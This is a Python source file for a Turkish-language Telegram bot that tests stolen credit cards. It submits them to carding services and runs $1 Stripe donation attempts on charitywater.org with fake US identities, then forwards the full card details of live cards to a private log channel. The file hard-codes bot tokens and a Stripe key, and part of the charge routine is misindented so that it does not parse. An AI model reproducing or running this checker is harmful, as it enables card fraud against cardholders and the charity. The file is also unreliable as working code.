import time
import requests
import re
import json
import os
import concurrent.futures
import urllib3
from faker import Faker
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from io import StringIO
from telebot import TeleBot
from telebot import types
from datetime import datetime, timedelta
import threading
from collections import defaultdict

user_card_check_counter = defaultdict(lambda: defaultdict(int))
BOT_TOKEN = "8110441189:AAH6hKH71YW3v7JMwh9f10VvqJnOvqoNrvI"
LOG_BOT_TOKEN = "7919225628:AAH5UHoGcogT69vnUrGqQFiVhG2MQ3wzT9M"
log_bot = TeleBot(LOG_BOT_TOKEN)


TOPICS = {
    "live": {"chat_id": -1002446719068, "thread_id": 19},
    "declined": {"chat_id": -1002446719068, "thread_id": 14},
    "unknown": {"chat_id": -1002446719068, "thread_id": 22},
    "log": {"chat_id": -1002446719068, "thread_id": 28}
}

OWNER_ID = 6369595142
JOINED_FILE = "joined_users.json"
BANNED_FILE = "banned_users.json"

# joined_users yükle
if os.path.exists(JOINED_FILE):
    with open(JOINED_FILE, "r") as f:
        joined_users = json.load(f)
        joined_users = {int(k): v for k, v in joined_users.items()}
else:
    joined_users = {}

# banned_users yükle
if os.path.exists(BANNED_FILE):
    with open(BANNED_FILE, "r") as f:
        banned_users = set(json.load(f))
else:
    banned_users = set()

# KAYDETME fonksiyonları
def save_joined():
    with open(JOINED_FILE, "w") as f:
        json.dump(joined_users, f)

def save_banned():
    with open(BANNED_FILE, "w") as f:
        json.dump(list(banned_users), f)

API_URL = "https://www.qnbchecker.xyz/cc_checker"

active_checker = set()

bot = TeleBot(BOT_TOKEN)

def clean_html_errors(text):
    # HTML tag'lerini temizle
    text = re.sub(r"<.*?>", "", text)
    # Dosya yollarını ve teknik uyarıları kaldır
    text = re.sub(r"(in\s+)?[A-Z]:\\.*?\.php.*?line\s+\d+", "", text, flags=re.IGNORECASE)
    return text.strip()

def send_log(log_type, text):
    try:
        data = TOPICS.get(log_type)
        if data:
            log_bot.send_message(chat_id=data["chat_id"], text=text, message_thread_id=data["thread_id"])
    except:
        pass
        
def check_cards_parallel(card_list):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(check_card, card) for card in card_list]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            results.append(result)
    return results

def is_authorized(message):
    return joined_users.get(message.from_user.id, False) and message.from_user.id not in banned_users



def get_bin_info(bin_number):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            bank = data.get("bank", "N/A")
            card_type = data.get("type", "N/A")
            country = data.get("country_name", "N/A")
            return f"{bank} - {card_type} - {country}"
        else:
            return "BIN bilgisi alınamadı"
    except Exception as e:
        return "BIN hatası"

def check_card(card):
    try:
        url = f"https://carder.zone/lynx/api.php?method=auth&cc={card.strip()}"
        res = requests.get(url, timeout=15)

        text = res.text.strip()
        if not text:
            text = "❓ API boş yanıt verdi."

        replacements = {
            "#Live": "✅",
            "#Declined": "❌",
            "#Unknown": "❓"
        }
        for key, emoji in replacements.items():
            text = text.replace(key, emoji)


        status = "live" if "✅" in text or "success" in text.lower() else "declined"

        # BIN'den ilk 6 haneyi al
        card_number = card.split("|")[0]
        bin_prefix = card_number[:6]
        bin_info = get_bin_info(bin_prefix)

        return {
            "card": card,
            "message": text,
            "status": status,
            "details": bin_info
        }

    except requests.exceptions.Timeout:
        return {
            "card": card,
            "message": "❌ API zaman aşımına uğradı.",
            "status": "error",
            "details": "BIN alınamadı"
        }

    except requests.exceptions.ConnectionError:
        return {
            "card": card,
            "message": "❌ API bağlantı hatası.",
            "status": "error",
            "details": "BIN alınamadı"
        }

    except Exception as e:
        return {
            "card": card,
            "message": f"❌ Bilinmeyen Hata: {str(e)}",
            "status": "error",
            "details": "BIN alınamadı"
        }



@bot.message_handler(commands=['stop'])
def stop_handler(message):
    uid = message.from_user.id
    if uid in active_checker:
        active_checker.discard(uid)
        bot.send_message(message.chat.id, "🛑 İşlemin durduruldu.")
    else:
        bot.send_message(message.chat.id, "ℹ️ Aktif bir işleminiz yok.")


import concurrent.futures

@bot.message_handler(commands=['aubakth'])
def check_command(message):
    if message.from_user.id in banned_users:
        bot.send_message(message.chat.id, "🛘 İşlem yasaklandı.")
        return

    lines = message.text.split("\n")

    if lines[0].startswith("/autZh"):
        lines[0] = lines[0].replace("/autsssh", "").strip()
    lines = [l.strip() for l in lines if l.strip()]

    if not lines:
        bot.send_message(message.chat.id, "⚠️ Kart bilgilerini /auth komutundan sonra gir. /check KART|AY|YIL|CVV")
        return

    if len(lines) > 120:
        bot.send_message(message.chat.id, "⚠️ En fazla 120 kart kontrol edebilirsin.")
        return

    total = len(lines)
    uid = message.from_user.id
    bot.send_message(message.chat.id, f"🧍 Auth Checker\n━━━━━━━━━━━━━━━━━━\n• Toplam Kart: {total}\n• Method: STRIPE AUTH\n• Başlıyor")

    live_list = []
    sender_info = f"👤 @{message.from_user.username or message.from_user.first_name} | ID: {uid}"

    for idx, card in enumerate(lines, 1):
        parts = card.split("|")
        if len(parts) < 4:
            continue

        card_number = parts[0]
        cvv = parts[3]

        if cvv == "000":
            banned_users.add(uid)
            save_banned()
            bot.send_message(message.chat.id, "🚫 Banlandınız! Lütfen banınızı açtırmak için @mtap67 ile iletişime geçin.")
            send_log("log", f"🚫 Banlandı: {uid} - CVV 000 girdi")
            return

        if user_card_check_counter[uid][card_number] >= 2:
            continue
        user_card_check_counter[uid][card_number] += 1

        result = check_card(card)
        if not result:
            continue

        status = result.get("status", "error")
        message_text = result.get("message", result.get("result", ""))
        details = result.get("details", "| Detay Yok")

        if status == "live":
            durum = result["message"]
            live_list.append(f"✅ {card} - {details}")
        elif status == "declined":
            durum = message_text
        elif status == "error":
            durum = "❌ API Hatası"
        else:
            durum = "❓"

        mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━━━━\n"
        mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━━━━\n"
        mesaj += f"🏦 BIN Bilgisi\n• {details}\n━━━━━━━━━━━━━━━━━━\n"
        mesaj += f"📊 Sonuç\n• Durum: {durum}\n━━━━━━━━━━━━━━━━━━"

        bot.send_message(message.chat.id, mesaj)

        # Log gönderimi
        if "live" in status:
            send_log("live", f"💳 {card}\n🏦 {details}\n📊 Sonuç: ✅ Payment Successful (STRIPE)\n{sender_info}")
        elif "declined" in status:
            send_log("declined", f"💳 {card}\n🏦 {details}\n📊 Sonuç: ❌ Declined: {message_text}\n{sender_info}")
        else:
            send_log("unknown", f"💳 {card}\n🏦 {details}\n📊 Sonuç: ❓ {message_text}\n{sender_info}")

    if live_list:
        bot.send_message(message.chat.id, "✅ Live Kartlar:\n" + "\n".join(live_list))

@bot.message_handler(commands=['toplucshk'])
def topluchk_handler(message):
    msg = bot.send_message(message.chat.id, "📁 Lütfen .txt dosyasını gönder.")
    bot.register_next_step_handler(msg, topluchk_dosya)

def topluchk_dosya(msg):
    try:
        file_info = bot.get_file(msg.document.file_id)
        file = bot.download_file(file_info.file_path)
        lines = StringIO(file.decode("utf-8", errors="ignore")).readlines()
        lines = [l.strip() for l in lines if l.strip()]

        if len(lines) > 200:
            bot.send_message(msg.chat.id, "⚠️ En fazla 200 kart gönderebilirsin.")
            return

        if msg.from_user.id in banned_users:
            bot.send_message(msg.chat.id, "🚫 İşlem yasaklandı.")
            return

        total = len(lines)
        uid = msg.from_user.id
        sender_info = f"👤 @{msg.from_user.username or 'Unknown'} | ID: {uid}"
        live_list = []
        prefix_counter = {}

        bot.send_message(msg.chat.id, f"🧾 Toplu Checker\n━━━━━━━━━━━━━━━\n• Toplam Kart: {total}\n• Method: STRIPE AUTH\n• Başlıyor")

        for idx, card in enumerate(lines, 1):
            if not card or "|" not in card:
                continue

            parts = card.split("|")
            if len(parts) < 4:
                continue

            card_number = parts[0]
            cvv = parts[3]

            # Ban kontrolü
            if cvv == "000":
                banned_users.add(uid)
                save_banned()
                bot.send_message(msg.chat.id, "🚫 Banlandınız! Lütfen banınızı açtırmak için @mtap67 ile iletişime geçin.")
                send_log("log", f"🚫 Banlandı (topluchk): {uid} - CVV 000")
                return

            # Gen kontrolü
            if card.endswith("000"):
                prefix = card[:6]
                prefix_counter[prefix] = prefix_counter.get(prefix, 0) + 1
                if prefix_counter[prefix] >= 10:
                    bot.send_message(msg.chat.id, f"🚫 Gen tespit edildi! Prefix: {prefix} | İşlem durduruldu.")
                    return

            # Aynı kartı 2'den fazla checkleme engeli
            if user_card_check_counter[uid][card_number] >= 2:
                continue
            user_card_check_counter[uid][card_number] += 1

            # Kartı kontrol et
            result = check_card(card)
            if not isinstance(result, dict):
                continue

            status = result.get("status", "")
            message_text = result.get("message", "Bilinmeyen sonuç")
            details = result.get("details", "| Detay Yok")

            if status == "live":
                live_list.append(f"✅ {card} - {details}")

            # Kart sonucu mesajı (mesaj_text doğrudan API mesajı)
            mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"🏦 BIN Bilgisi\n• {details}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"📊 Sonuç\n• Mesaj: {message_text}\n━━━━━━━━━━━━━━━"
            bot.send_message(msg.chat.id, mesaj)

            # Log gönderimi
            if status == "live":
                send_log("live", f"💳 {card}\n🏦 {details}\n📊 Sonuç: ✅ {message_text}\n{sender_info}")
            elif status == "declined":
                send_log("declined", f"💳 {card}\n🏦 {details}\n📊 Sonuç: ❌ {message_text}\n{sender_info}")
            else:
                send_log("unknown", f"💳 {card}\n🏦 {details}\n📊 Sonuç: ❓ {message_text}\n{sender_info}")

        if live_list:
            bot.send_message(msg.chat.id, "✅ Live Kartlar\n" + "\n".join(live_list))

    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Hata oluştu: {str(e)}")

@bot.message_handler(commands=['charge'])
def charge_command(message):
    if message.from_user.id in banned_users:
        bot.send_message(message.chat.id, "🚫 İşlem yasaklandı.")
        return

    lines = message.text.split("\n")

    if lines[0].startswith("/charge"):
        lines[0] = lines[0].replace("/charge", "").strip()
    lines = [l.strip() for l in lines if l.strip()]

    if not lines:
        bot.send_message(message.chat.id, "⚠️ Kart bilgilerini /charge komutundan sonra gir. /charge KART|AY|YIL|CVV")
        return

    if len(lines) > 50:
        bot.send_message(message.chat.id, "⚠️ En fazla 50 kart kontrol edebilirsin.")
        return

    total = len(lines)
    uid = message.from_user.id
    bot.send_message(message.chat.id, f"💵 FG CHECKER\n━━━━━━━━━━━━━━━━━━\n• Toplam Kart: {total}\n• Method: CHARGE\n• Başlıyor")

    live_list = []
    sender_info = f"👤 @{message.from_user.username or message.from_user.first_name} | ID: {uid}"

    for idx, card in enumerate(lines, 1):
        parts = card.split("|")
        if len(parts) < 4:
            continue

        card_number = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvv = parts[3]

        if cvv == "000":
            banned_users.add(uid)
            save_banned()
            bot.send_message(message.chat.id, "🚫 Banlandınız! Lütfen banınızı açtırmak için @mtap67 ile iletişime geçin.")
            send_log("log", f"🚫 Banlandı: {uid} - CVV 000 girdi")
            return

        if user_card_check_counter[uid][card_number] >= 2:
            continue
        user_card_check_counter[uid][card_number] += 1

        try:
            # Prepare data for the new API
            if yy[:2] == '20':
                yy = yy[2:]
            
            # Generate fake US data
            fake = Faker('en_US')
            first_name = fake.first_name()
            last_name = fake.last_name()
            address_1 = fake.street_address()
            city = fake.city()
            state = fake.state_abbr()
            postcode = fake.zipcode()
            email = fake.email(domain='gmail.com')
            name = f"{first_name}+{last_name}"
            
            # Make the API requests
            session = requests.Session()
            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.charitywater.org',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            }
            
            # First request
            data = {
                'event': 'contactInfoProvided',
                'properties[country]': 'us',
                'properties[email]': email,
                'properties[is_subscription]': 'false',
                'properties[phoneNumber]': '',
            }
            session.post('https://www.charitywater.org/api/v1/iterable/event/track', headers=headers, data=data)
            
            # Second request - payment method creation
            headers['origin'] = 'https://js.stripe.com'
            headers['referer'] = 'https://js.stripe.com/'
            data = (
                f"type=card&billing_details[address][postal_code]={postcode}"
                f"&billing_details[address][city]={city.replace(' ', '+')}"
                f"&billing_details[address][country]=US&billing_details[address][line1]={address_1.replace(' ', '+').replace(',', '%2C')}"
                f"&billing_details[email]={email.replace('@', '%40')}"
                f"&billing_details[name]={name}"
                f"&card[number]={card_number}"
                f"&card[cvc]={cvv}"
                f"&card[exp_month]={mm}"
                f"&card[exp_year]={yy}"
                f"&pasted_fields=number"
                f"&referrer=https%3A%2F%2Fwww.charitywater.org&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"
            )
            response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            payment_data = response.json()
            idstripe = payment_data.get('id')
            
            # Third request - donation attempt
            headers['origin'] = 'https://www.charitywater.org'
            headers['referer'] = 'https://www.charitywater.org/'
            data = {
                'country': 'us',
                'payment_intent[email]': email,
                'payment_intent[amount]': '1',
                'payment_intent[currency]': 'usd',
                'payment_intent[payment_method]': idstripe,
                'disable_existing_subscription_check': 'false',
                'donation_form[amount]': '1',
                'donation_form[comment]': '',
                'donation_form[display_name]': '',
                'donation_form[email]': email,
                'donation_form[name]': first_name,
                'donation_form[payment_gateway_token]': '',
                'donation_form[payment_monthly_subscription]': 'false',
                'donation_form[surname]': last_name,
                'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
                'donation_form[metadata][email_consent_granted]': 'true',
                'donation_form[address][address_line_1]': f"{address_1}, {state} {postcode}",
                'donation_form[address][city]': 'Fort Wainwright',
                'donation_form[address][zip]': postcode,
            }
            response = session.post('https://www.charitywater.org/donate/stripe', headers=headers, data=data)
            # Donation attempt yanıtı al
print("Stripe Donation yanıtı:", response.text)
print("Status Code:", response.status_code)

try:
    response_data = response.json()
except json.decoder.JSONDecodeError:
    response_data = {}
    print("JSON çözümlenemedi. Yanıt:", response.text)

            
            # Parse response
            if 'error' in response_data:
                if response_data['error'].get('code') == 'incorrect_cvc':
                    status = "Approved CCN"
                    message_text = "Your card's security code or expiration date is incorrect. ✅"
                    durum_emoji = "✅"
                    log_type = "live"
                    live_list.append(f"✅ {card}")
                else:
                    status = "Declined"
                    message_text = response_data['error'].get('message', 'Declined ❌')
                    durum_emoji = "❌"
                    log_type = "declined"
            else:
                status = "Approved"
                message_text = "Your card is alive, order 3D ✅"
                durum_emoji = "✅"
                log_type = "live"
                live_list.append(f"✅ {card}")

        except Exception as e:
            status = "Error"
            message_text = f"API hatası: {str(e)}"
            durum_emoji = "❌"
            log_type = "error"

        bin_info = get_bin_info(card_number[:6])

        mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━━━━\n"
        mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━━━━\n"
        mesaj += f"🏦 BIN Bilgisi\n• {bin_info}\n━━━━━━━━━━━━━━━━━━\n"
        mesaj += f"📊 Sonuç\n• Durum: {durum_emoji} {message_text}\n━━━━━━━━━━━━━━━━━━"
        bot.send_message(message.chat.id, mesaj)

        send_log(log_type, f"💳 {card}\n🏦 {bin_info}\n📊 Sonuç: {durum_emoji} {message_text}\n{sender_info}")

    if live_list:
        bot.send_message(message.chat.id, "✅ Live Kartlar:\n" + "\n".join(live_list))




@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.from_user.id in banned_users:
        return

    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or 'kullanıcı'
    full_name = message.from_user.first_name + (" " + message.from_user.last_name if message.from_user.last_name else "")

    # ID'yi dosyaya yaz (tekrarı engelle)
    try:
        with open("started_users.txt", "a+") as f:
            f.seek(0)
            if str(user_id) not in f.read():
                f.write(f"{user_id}\n")
    except:
        pass  # Dosya erişim hatasını sessiz geç

    send_log("log", f"👤 Yeni kullanıcı: @{username} | {full_name} | ID: {user_id}")

    hosgeldin = (
        f"👋 <b>Hoş geldin! @{username}</b> - <b>BCCCS</b>\n"
        f"📩 <i>CHECKER İÇİN AŞAĞIDAKİ KOMUTLARI KULLANABİLİRSİN</i>\n\n"
        f"🔹 <b>/auth</b> — Stripe Auth ile kart kontrolü - DEAKTIF\n"
        f"🔹 <b>/charge</b> — Stripe Charge ($1) ile kontrol\n"
        f"🔹 <b>/topluchk</b> — .txt ile toplu kart kontrolü - DEAKTIF\n"
        f"⚠️ <i>CVV 000 GIRERSENIZ OTOMATIK OLARAK BANLANIRSINIZ</i>"
    )

    bot.reply_to(message, hosgeldin, parse_mode='HTML')
    



@bot.message_handler(commands=['parser'])
def parser_handler(message):
    msg = bot.send_message(message.chat.id, "Bozuk kart içeren .txt dosyası gönder.")
    bot.register_next_step_handler(msg, parser_cevap)

def parser_cevap(msg):
    file_info = bot.get_file(msg.document.file_id)
    file = bot.download_file(file_info.file_path)
    lines = StringIO(file.decode("utf-8", errors="ignore")).readlines()
    parsed = []
    for line in lines:
        parts = re.findall(r'\d{12,19}|\d{2,4}', line)
        if len(parts) >= 4:
            ay = parts[1].zfill(2)
            yil = parts[2] if len(parts[2]) == 4 else f"20{parts[2]}"
            cvv = parts[3].zfill(3)
            parsed.append(f"{parts[0]}|{ay}|{yil}|{cvv}")
    with open("parser_result.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(parsed))
    with open("parser_result.txt", "rb") as f:
        bot.send_document(msg.chat.id, f)

@bot.message_handler(commands=['ban'])
def ban_user(message):
    try:
        user_id = int(message.text.split()[1])
        
        # Ban listesine ekle
        banned_users.add(user_id)
        save_banned()
        
        # Aktif checker'dan çıkar
        if user_id in active_checker:
            active_checker.discard(user_id)
        
        bot.send_message(message.chat.id, f"🚫 Kullanıcı {user_id} başarıyla banlandı.")
        send_log("log", f"🚫 Manuel Ban: {user_id} admin tarafından banlandı.")

        # Kullanıcıya mesaj at (isteğe bağlı)
        try:
            bot.send_message(user_id, "🚫 İşleminiz durduruldu ve banlandınız. Eğer bu bir hata ise @mtap67 ile iletişime geçin.")
        except:
            pass  # Kullanıcı botu engellemiş olabilir, sessiz geç

    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Hata oluştu: {str(e)}")


@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = int(message.text.split()[1])
    banned_users.discard(user_id)
    bot.send_message(message.chat.id, f"✅ {user_id} unbanlandı.")
        


if __name__ == "__main__":
    print("✅ Bot başlatılıyor... Sadece bir örneği çalıştırın!")
    bot.infinity_polling()
